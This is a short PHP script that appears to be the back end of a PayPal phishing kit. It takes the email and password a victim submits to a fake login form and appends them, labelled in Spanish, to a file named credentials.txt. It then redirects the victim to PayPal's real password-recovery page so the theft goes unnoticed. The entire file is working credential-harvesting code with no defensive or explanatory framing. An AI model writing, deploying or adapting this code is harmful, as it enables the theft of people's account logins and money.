<?php

file_put_contents("credentials.txt", "[+] Paypal -> Usuario: " . $_POST['login_email'] . " Contraseña: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.com/authflow/password-recovery/');
exit();
?>
